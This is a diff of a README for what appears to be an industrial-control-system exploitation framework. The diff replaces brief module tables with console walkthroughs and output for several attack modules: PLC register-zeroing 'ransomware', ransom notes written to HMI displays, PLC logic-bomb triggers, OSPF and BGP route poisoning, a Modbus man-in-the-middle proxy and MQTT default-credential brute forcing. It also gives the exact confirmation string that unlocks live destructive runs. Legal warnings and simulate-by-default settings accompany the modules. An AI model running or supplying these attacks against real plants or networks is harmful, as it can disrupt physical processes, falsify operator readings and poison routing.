@@ -177,41 +177,162 @@ Full documentation is available in both English and Brazilian Portuguese:
 
 ---
 
-## Security Modules (BLOCO J)
+## BLOCO J - Attack Categories (v2.0.0)
 
-New attack category modules added in BLOCO J expansion:
+> **LEGAL WARNING:** All modules in this section are for **authorized security testing, research, and educational use only**. Execution against systems without explicit written authorization is a federal crime under computer fraud statutes in most jurisdictions. Ransomware/wiper modules require triple confirmation. The authors and Uniao Geek assume no liability for misuse.
 
-### Ransomware / Impact Simulation
+### Ransomware (OT/ICS) - Educational Simulation Only
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `plc_project_locker` | `exploits/ransomware/` | CATASTROPHIC | Zeros all Modbus holding registers (FC16). Simulates CISA AA26-097A Iranian APT PLC manipulation. Triple gate required. |
-| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTROPHIC | Overwrites SCADA display string tags with ransom note via Modbus FC16. Triple gate required. |
+> **WARNING:** Ransomware modules are STRICTLY SIMULATE-ONLY by default.
+> Triple confirmation required for live execution. Unauthorized use is a federal crime.
+
+```bash
+ixf > use exploits/ransomware/plc_project_locker
+ixf (PLCProjectLocker) > set target 192.168.1.10
+ixf (PLCProjectLocker) > set port 502
+ixf (PLCProjectLocker) > set simulate true   # Required safety flag
+ixf (PLCProjectLocker) > run
+
+[SIMULATE] Modbus TCP connection to 192.168.1.10:502
+[SIMULATE] Would write zeros to holding registers: FC16 @ addr 0 len 125
+[SIMULATE] 2 FC16 requests required (123 + 2 registers)
+[SIMULATE] Impact: PLC would halt program execution - CISA AA26-097A TTP
+[!] To run live: set simulate false, set destructive true
+[!] Then type exact confirmation string when prompted: I_UNDERSTAND_THIS_IS_DESTRUCTIVE
+```
+
+```bash
+ixf > use exploits/ransomware/hmi_display_ransomware
+ixf (HMIDisplayRansomware) > set target 192.168.1.20
+ixf (HMIDisplayRansomware) > set display_register 1000
+ixf (HMIDisplayRansomware) > set simulate true
+ixf (HMIDisplayRansomware) > run
+
+[SIMULATE] Would write 20 registers (40 chars) at Modbus register 1000
+[SIMULATE] HMI screen would show: "YOUR SYSTEM IS LOCKED..."
+[SIMULATE] Based on TRITON/TRISIS HMI manipulation TTP
+[!] Triple gate required for live execution
+```
+
+| Module | Path | Impact | Requires |
+|--------|------|--------|----------|
+| `plc_project_locker` | `exploits/ransomware/` | CATASTROPHIC | Triple gate |
+| `hmi_display_ransomware` | `exploits/ransomware/` | CATASTROPHIC | Triple gate |
 
 ### Persistence
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `plc_logic_bomb_inject` | `exploits/persistence/` | HIGH | Writes a trigger value to a designated holding register to activate a pre-planted logic bomb. Based on INCONTROLLER/PIPEDREAM TTPs. |
+> **WARNING:** Logic bomb modules simulate activation of pre-planted PLC routines. Unauthorized execution disrupts physical processes.
 
-### Routing Attacks (RTP)
+```bash
+ixf > use exploits/persistence/plc_logic_bomb_inject
+ixf (PLCLogicBombActivate) > set target 192.168.1.10
+ixf (PLCLogicBombActivate) > set trigger_register 9999
+ixf (PLCLogicBombActivate) > set trigger_value 0xDEAD
+ixf (PLCLogicBombActivate) > set simulate true
+ixf (PLCLogicBombActivate) > run
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `ospf_lsa_inject` | `exploits/routing/` | HIGH | Injects forged OSPF Router LSA to poison routing tables. Based on DCmal-2025 OSPF spoofing (MDPI 2025). Requires Scapy. |
-| `bgp_vortex_dos` | `exploits/routing/` | HIGH | Sends 3 crafted BGP UPDATE messages triggering persistent route oscillation. Based on USENIX Security 2025 "BGP Vortex" (Stoeger et al.). |
+[SIMULATE] Would write value 0xDEAD (57005) to holding register 9999
+[SIMULATE] On 192.168.1.10:502 unit_id=1 using FC16
+[SIMULATE] If a logic bomb routine monitors register 9999, it will activate
+[SIMULATE] Based on INCONTROLLER/PIPEDREAM ICS malware TTPs (Dragos 2022)
+[!] Set destructive true to execute after confirmation
+```
+
+| Module | Path | Impact | Reference |
+|--------|------|--------|-----------|
+| `plc_logic_bomb_inject` | `exploits/persistence/` | HIGH | CISA AA22-103A, Dragos CHERNOVITE |
+
+### Routing Table Poisoning
+
+> **WARNING:** Routing injection attacks redirect network traffic and may disrupt production OT/IT services. Authorized lab use only.
+
+```bash
+ixf > use exploits/routing/ospf_lsa_inject
+ixf (OSPFLSAInject) > set iface eth0
+ixf (OSPFLSAInject) > set area_id 0.0.0.0
+ixf (OSPFLSAInject) > set poison_prefix 10.0.0.0
+ixf (OSPFLSAInject) > set simulate true
+ixf (OSPFLSAInject) > run
+
+[SIMULATE] OSPF LSA Type Router (Type 1) would be crafted:
+[SIMULATE]   Area: 0.0.0.0 / Router-ID: 192.168.1.100
+[SIMULATE]   Network: 10.0.0.0/255.255.255.0 via metric=1
+[SIMULATE] LSU packet (72 bytes): 02010024...
+[SIMULATE] Would send to 224.0.0.5 (AllSPFRouters) x3 on eth0
+[!] PREREQ: Scapy + network segment running OSPF (unauthenticated)
+```
+
+```bash
+ixf > use exploits/routing/bgp_vortex_dos
+ixf (BGPVortexDoS) > set target 10.0.0.1
+ixf (BGPVortexDoS) > set attacker_as 65001
+ixf (BGPVortexDoS) > set victim_as 65000
+ixf (BGPVortexDoS) > set simulate true
+ixf (BGPVortexDoS) > run
+
+[SIMULATE] Would establish BGP session to 10.0.0.1:179
+[SIMULATE] UPDATE-A: AS_PATH=[65001,65000] MED=100 COMMUNITY=65001:100
+[SIMULATE] UPDATE-B: WITHDRAW + re-announce AS_PATH=[65001] MED=200
+[SIMULATE] UPDATE-C: AS_PATH=[65001,65000,65001] MED=50 COMMUNITY=65001:50
+[SIMULATE] These trigger persistent oscillation in BGP Decision Process (Vortex)
+[SIMULATE] Reference: Stoeger et al., USENIX Security 2025 - BGP Vortex
+```
+
+| Module | Path | Impact | Reference |
+|--------|------|--------|-----------|
+| `ospf_lsa_inject` | `exploits/routing/` | HIGH | DCmal-2025 OSPF spoofing (MDPI 2025), RFC 2328 |
+| `bgp_vortex_dos` | `exploits/routing/` | HIGH | Stoeger et al., USENIX Security 2025 |
+
+### MiTM - Modbus TCP Inline
+
+> **WARNING:** Inline proxy with value injection falsifies sensor readings delivered to operators. May cause process misjudgment with physical consequences. Authorized lab only.
+
+```bash
+ixf > use assessment/lateral/modbus_mitm_inline
+ixf (ModbusMiTM) > set target 192.168.1.10       # PLC
+ixf (ModbusMiTM) > set listen_host 0.0.0.0
+ixf (ModbusMiTM) > set listen_port 1502           # Attacker proxy port
+ixf (ModbusMiTM) > set simulate true
+ixf (ModbusMiTM) > run
+
+[SIMULATE] Would bind TCP proxy on 0.0.0.0:1502
+[SIMULATE] Forwarding all connections to real PLC at 192.168.1.10:502
+[SIMULATE] All Modbus frames logged with decoded function code info
+[SIMULATE] Value injection DISABLED (passive logging only)
+
+# Live passive capture (no value injection - only destructive false needed):
+ixf (ModbusMiTM) > set simulate false
+ixf (ModbusMiTM) > run
+
+[*] Modbus MiTM proxy started on 0.0.0.0:1502
+[*] Forwarding to 192.168.1.10:502
+[+] Client connected: 192.168.1.50
+[>] FC3 ReadHoldingRegs addr=0 count=10 -> PLC
+[<] Response: 10 registers [0x0001, 0x00F2, ...]
+[>] FC16 WriteRegs addr=0 data=[...] -> PLC  [LOGGED]
+```
+
+| Module | Path | Impact | Prerequisites |
+|--------|------|--------|---------------|
+| `modbus_mitm_inline` | `assessment/lateral/` | HIGH | ARP poisoning active (modbus_arp_mitm first) |
 
 ### Credential Attacks
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `ics_mqtt_bruteforce` | `creds/generic/` | MEDIUM | MQTT broker credential bruteforce using native Python socket (no external MQTT library). Checks CONNACK return codes. |
+```bash
+ixf > use creds/generic/ics_mqtt_bruteforce
+ixf (MQTTBruteforce) > set target 192.168.1.50
+ixf (MQTTBruteforce) > set port 1883
+ixf (MQTTBruteforce) > set simulate true
+ixf (MQTTBruteforce) > run
 
-### MiTM / Lateral Movement
+[SIMULATE] Would attempt 18 credential pairs against MQTT broker at 192.168.1.50:1883
+[SIMULATE] First 5: admin:admin, admin:password, admin:, :, guest:guest
+[SIMULATE] Source: built-in ICS defaults (Mosquitto, HiveMQ, EMQX, SCADA-specific)
+```
 
-| Module | Path | Impact | Description |
-|--------|------|--------|-------------|
-| `modbus_mitm_inline` | `assessment/lateral/` | HIGH | Inline Modbus TCP proxy. Logs all function codes with decoded register info. Optional value injection in FC03/FC04 responses. |
+| Module | Path | Impact | Reference |
+|--------|------|--------|-----------|
+| `ics_mqtt_bruteforce` | `creds/generic/` | MEDIUM | OASIS MQTT v3.1.1, MITRE T0806 |
 
 ### CVE 2025
 
@@ -219,18 +340,18 @@ New attack category modules added in BLOCO J expansion:
 |--------|------|-----|-------------|
 | `siemens_telecontrol_cve_2025` | `cve/siemens/` | CVE-2025-28390 | Siemens TeleControl Server Basic authentication bypass + path traversal. CVSS 9.8. |
 
-### Capability Table Update
+### Coverage Summary
 
-| Category | Modules |
-|----------|---------|
-| Ransomware / Impact | `plc_project_locker`, `hmi_display_ransomware`, `ekans_snake_ics_ransomware` |
-| Persistence | `plc_logic_bomb_inject` |
-| Routing (RTP) | `ospf_lsa_inject`, `bgp_vortex_dos` |
-| MiTM | `modbus_arp_mitm`, `modbus_mitm_inline` |
-| Credentials | `ics_mqtt_bruteforce`, + 30+ vendor-specific modules |
-| CVE 2025 | `siemens_telecontrol_cve_2025` |
+| Category | Modules | Default Mode |
+|----------|---------|-------------|
+| Ransomware / Impact | `plc_project_locker`, `hmi_display_ransomware` | simulate=True (triple gate for live) |
+| Persistence | `plc_logic_bomb_inject` | simulate=True |
+| Routing (RTP) | `ospf_lsa_inject`, `bgp_vortex_dos` | simulate=True |
+| MiTM | `modbus_arp_mitm`, `modbus_mitm_inline` | simulate=True |
+| Credentials | `ics_mqtt_bruteforce`, + 30+ vendor modules | simulate=True |
+| CVE 2025 | `siemens_telecontrol_cve_2025` | simulate=True |
 
-All destructive modules default to `simulate=True`. Ransomware/wiper modules require triple gate confirmation (`simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`).
+All destructive modules default to `simulate=True`. Ransomware/wiper modules require triple gate confirmation: `simulate=False` + `destructive=True` + `explicit_confirm="I_UNDERSTAND_THIS_IS_DESTRUCTIVE"`.
 
 ---
 
